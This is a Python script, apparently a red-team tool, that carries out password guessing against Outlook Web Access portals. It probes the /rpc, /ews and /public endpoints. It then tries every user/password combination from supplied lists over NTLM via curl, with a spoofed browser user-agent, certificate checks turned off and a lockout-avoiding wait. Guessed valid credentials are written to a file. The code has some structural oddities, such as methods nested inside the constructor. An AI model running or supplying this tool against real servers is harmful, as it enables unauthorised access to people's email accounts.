#!/usr/bin/python
import time
import sys
import logging
import argparse
import subprocess
## Comments ##
# I haven't figured out how to close outfile in the class
# Could lead to portability issues.
# It currently depends on Python3 garbage collection to close the file.
class owa_bruteforce():
	def __init__(self, address, userfilename, passfilename, tries, wait, output):
		self.address = address
		self.userfilename = userfilename
		self.passfilename = passfilename
		self.tries = 0
		self.tries_max = int(tries)
		self.wait = int(wait)
		self.output = output
		self.rpc_status = 0
		self.ews_status = 0
		self.public_status = 0 # I don't public doesn't actually check. Research to confirm and remove if unneeded
		self.certverifyON = 0
		self.list = ('rpc', 'ews', 'public')
		self.list_position = 0

		def disp_check_result(self, httpquestion):
			if "401 Unauthorized" in httpquestion and self.list[self.list_position] == 'rpc':
				print('\033[92m'+'[+]'+'\033[0m'+'{}'.format(self.list[self.list_position]))
				logging.info('====RPC AVAILABLE====')
				self.rpc_status = 1
			elif "401 Unauthorized" in httpquestion and self.list[self.list_position] == 'ews':
				print('\033[92m'+'[+]'+'\033[0m'+'{}'.format(self.list[self.list_position]))
				logging.info('====EWS AVAILABLE====')
				self.ews_status = 1
			elif "404 Not Found" in httpquestion and self.list[self.list_position] == 'public':
				print('\033[92m'+'[+]'+'\033[0m'+'{}'.format(self.list[self.list_position]))
				logging.info('====PUBLIC AVAILABLE====')
				self.public_status = 1
			else:
				print('\033[91m'+'[-]'+'\033[0m'+'{}'.format(self.list[self.list_position]))
				logging.info('===={} NOT AVAILABLE===='.format(self.list[self.list_position]))
			# print(httpquestion) # SET AS A VERBOSE OPTION
			logging.info(httpquestion)

		# def cert_verification_failed(self, host):
		# 	logging.info('====Certificate Verification failed====')
		# 	logging.info('====Using -k to Disregard Certificate====')
		# 	httpquestion_raw = subprocess.check_output(['curl', '-I', '-k', '-ntlm', host], stderr=subprocess.PIPE)
		# 	httpquestion = httpquestion_raw.decode(encoding='utf-8')
		# 	# print(httpquestion) # Set as a verbose option
		# 	disp_check_result(self, httpquestion)
		# 	# print('++++++++++++++++++++++++++++++++++++++++')

		def check(self):
			print('Checking for /rpc, /ews and /public...')
			logging.info('====Checking for rpc, ews and public====')
			for self.list_position in range(3):
				try:
					host = "https://" + self.address + "/" + self.list[self.list_position]
					httpresponse_raw = subprocess.check_output(['curl', '-I', '-k', '-ntlm', host], stderr=subprocess.PIPE)
					httpresponse = httpresponse_raw.decode(encoding='utf-8')
					disp_check_result(self, httpresponse)
				except:
					print('Unexpected Error:', sys.exc_info())
					raise SystemExit
			print('\033[94m'+'[*]'+'\033[0m'+'Check Complete')
			logging.info('Checking complete.')
			self.run_owabruteforce()

		check(self)

	def run_owabruteforce(self):
		try:
			if self.output != None:
				outfile = open(self.output, 'w')
			with open(self.passfilename) as passwords:
				for pass_line in passwords:
					if self.tries == self.tries_max or self.tries > self.tries_max:
						print('Waiting for {} seconds'.format(self.wait))
						self.tries = 0
						time.sleep(self.wait)
					if pass_line == None:
						logging.info('Guessed all passwords...')
						raise SystemExit
					passw = self.CleanInput(pass_line)
					with open(self.userfilename) as users:
						for user_line in users:
							user = self.CleanInput(user_line)
							answer = self.attempt_guess(user, passw)
							time.sleep(.75)
							if answer != None and self.output != None:
								answer = answer + '\r\n'
								outfile.write(answer)
								continue
					self.tries = self.tries + 1
		except:
			print('Unexpected Error in run_owabruteforce:', sys.exc_info())
			raise SystemExit

	def CleanInput(self, dirty):
		clean = dirty.strip('\n').strip('\t').strip('\r')
		return clean

	def disp_attempt_guess(self, user, passw, httpresponse, protocol):
		if "404 Not Found" in httpresponse and protocol == 'rpc':
			print('\033[92m'+'[+]'+'\033[0m'+'{}:{}'.format(user, passw))
			answer = '[+] {}:{}'.format(user, passw)
			logging.info(httpresponse)
			logging.info(answer)
			return answer
		elif "500 Internal Server Error" in httpresponse and protocol == 'ews':
			print('\033[92m'+'[+]'+'\033[0m'+'{}:{}'.format(user, passw))
			answer = '[+] {}:{}'.format(user, passw)
			logging.info(httpresponse)
			logging.info(answer)
			return answer
		elif "404 Not Found" in httpresponse and protocol == 'public':
			print('\033[92m'+'[+]'+'\033[0m'+'{}:{}'.format(user, passw))
			answer = '[+] {}:{}'.format(user, passw)
			logging.info(httpresponse)
			logging.info(answer)
			return answer
		else:
			print('\033[91m'+'[-]'+'\033[0m'+'{}:{}'.format(user, passw))
		# print(httpresponse) # SET AS A VERBOSE OPTION
		logging.info(httpresponse)
		logging.info('[-] {}:{}'.format(user, passw))

	def attempt_guess(self, user, passw):
		try:
			user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
		
			if self.rpc_status == 1:
				protocol = 'rpc'
			elif self.ews_status == 1:
				protocol = 'ews'
			elif self.public_status == 1:
				protocol = 'public'
			else:
				print('No protocol will work.')
				raise SystemExit

			host = 'https://' + self.address + '/' + protocol
			creds_combo = '{}:{}'.format(user, passw)

			httpresponse_raw = subprocess.check_output(['curl', '-I', '-k',
								 '--ntlm', '-A', user_agent, '-u', creds_combo, host],
								 stderr=subprocess.PIPE)
			httpresponse = httpresponse_raw.decode(encoding='utf-8')
			answer = self.disp_attempt_guess(user, passw, httpresponse, protocol)
		except:
			print('Unexpected Error in run_owabruteforce:', sys.exc_info())
			raise SystemExit
		return answer


if __name__ == "__main__":
	logging.basicConfig(filename='PG13.log', level=logging.INFO)

	parser = argparse.ArgumentParser('Password Guessing against OWA')
	parser.add_argument('-a', '--address', required=True, help='URL of OWA portal')
	parser.add_argument('-u', '--users', required=True, help='List of Users to password against')
	parser.add_argument('-pw', '--passwords', required=True, help='List of Passwords to be tested')
	parser.add_argument('-t', '--tries', required=True, help='Number of attempts before waiting')
	parser.add_argument('-w', '--wait', required=True, help='Wait time after reaching max number of tries')
	parser.add_argument('-o', '--output', required=True, help='File to write output to')

	args = vars(parser.parse_args())

	address = args["address"] if args["address"] else None
	userfilename = args["users"] if args["users"] else None
	passfilename = args["passwords"] if args["passwords"] else None
	tries = args["tries"] if args["tries"] else "9999999"
	wait = args["wait"] if args["wait"] else "0"
	output = args["output"] if args["output"] else None

	owa_bruteforce(address, userfilename, passfilename, tries, wait, output)